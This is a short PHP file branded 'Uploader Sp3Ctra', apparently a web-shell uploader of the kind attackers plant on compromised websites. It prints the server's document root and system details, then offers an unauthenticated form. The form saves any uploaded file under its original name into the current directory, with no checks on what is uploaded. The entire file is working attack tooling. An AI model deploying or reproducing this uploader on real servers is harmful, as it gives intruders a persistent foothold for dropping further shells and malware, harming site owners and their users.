<?php
echo "<title>Uploader Sp3Ctra</title><b>Sp3Ctra :===>>> ./Yonko  </b></br>".$_SERVER['DOCUMENT_ROOT']."</br>".php_uname();   
$cwd = getcwd(); 
Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  
<input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  
</form>  </center></td></tr> </table><br>'; 
if (!empty ($_FILES['uploads'])) {     
    move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     
    Echo "<script>alert('upload Done');       
    </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ; 
?>
